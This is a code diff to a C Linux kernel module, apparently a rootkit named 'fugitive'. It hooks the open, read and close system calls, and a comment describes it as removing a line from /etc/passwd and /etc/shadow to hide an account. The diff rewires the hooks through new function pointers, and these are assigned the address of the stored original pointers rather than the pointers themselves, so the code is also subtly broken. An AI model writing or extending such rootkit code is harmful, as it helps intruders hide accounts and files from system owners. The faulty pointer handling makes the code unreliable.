@@ -7,6 +7,10 @@ static struct sctm_hook fugitive__hooks[3];
 static char *fugitive__line = NULL;
 static struct sctm *fugitive__sctm = NULL;
 
+asmlinkage int (*good_open)(char *, int, mode_t) = NULL;
+asmlinkage ssize_t (*good_read)(int, void *, size_t) = NULL;
+asmlinkage int (*good_close)(int) = NULL;
+
 /* remove a line from "/etc/passwd" and "/etc/shadow" */
 int fugitive(const char __user *line) {
   char *_line;
@@ -102,14 +106,17 @@ int fugitive_init(struct sctm *sctm) {
     .call = __NR_close,
     .hook = (sctm_syscall_handler_t) &this_is_requiem
   };
+  good_close = (asmlinkage int (*)(int)) &fugitive__hooks[0].original;
   fugitive__hooks[1] = (struct sctm_hook) {
     .call = __NR_open,
     .hook = (sctm_syscall_handler_t) &king_crimson
   };
+  good_open = (asmlinkage int (*)(char *, int, mode_t)) &fugitive__hooks[1].original;
   fugitive__hooks[2] = (struct sctm_hook) {
     .call = __NR_read,
     .hook = (sctm_syscall_handler_t) &erase_time
   };
+  good_read = (asmlinkage ssize_t (*)(int, void *, size_t)) &fugitive__hooks[2].original;
   
   fugitive__sctm = sctm;
   return 0;
@@ -303,12 +310,12 @@ asmlinkage int king_crimson(char *pathname, int flags, mode_t mode){
         //printk("need to hide file %s\n", pathname);
         // HOOK_SYSCALL(sys_call_table, good_read, erase_time, __NR_read);
     }
-    return (*fugitive__hooks[1].original)((unsigned long) pathname, (unsigned long) flags, (unsigned long) mode, 0L, 0L, 0L);
+    return (*good_open)(pathname, flags, mode);
 }
 
 asmlinkage ssize_t erase_time(int fd, void *buf, size_t count){
     ssize_t ret;
-    ret = (*fugitive__hooks[2].original)((unsigned long) fd, (unsigned long) buf, (unsigned long) count, 0L, 0L, 0L);
+    ret = (*good_read)(fd, buf, count);
 
     // if()
     //printk("the power of king crimson!\n");
@@ -321,6 +328,6 @@ asmlinkage int this_is_requiem(int fd){
         // UNHOOK_SYSCALL(sys_call_table, good_read, __NR_read);
         erased = 1;
     }
-    return (*fugitive__hooks[0].original)((unsigned long) fd, 0L, 0L, 0L, 0L, 0L);
+    return (*good_close)(fd);
 }
 
